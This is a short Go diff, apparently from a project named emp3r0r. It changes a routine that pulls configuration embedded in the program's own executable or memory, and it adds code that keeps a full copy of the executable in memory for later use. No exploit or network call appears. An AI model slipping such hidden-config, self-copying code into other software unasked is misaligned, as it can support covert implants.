@@ -10,6 +10,9 @@ import (
 	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 )
 
+// EXE_MEM_FILE save the whole executable
+var EXE_MEM_FILE = make([]byte, 0)
+
 // ExtractData extract embedded data from args[0] or process memory
 func ExtractData() (data []byte, err error) {
 	data, err = DigEmbeddedDataFromExe()
@@ -92,6 +95,12 @@ func DigEmbeddedData(data []byte) (embedded_data []byte, err error) {
 		err = fmt.Errorf("Digged nothing from %d of given data", len(data))
 		return
 	}
+
+	// copy executable file to EXE_MEM_FILE for later use
+	EXE_MEM_FILE = data
+	log.Printf("Saved %d bytes of executable to EXE_MEM_FILE", len(EXE_MEM_FILE))
+
+	// found
 	log.Printf("Digged %d config bytes from %d bytes of given data", len(embedded_data), len(data))
 	return
 }
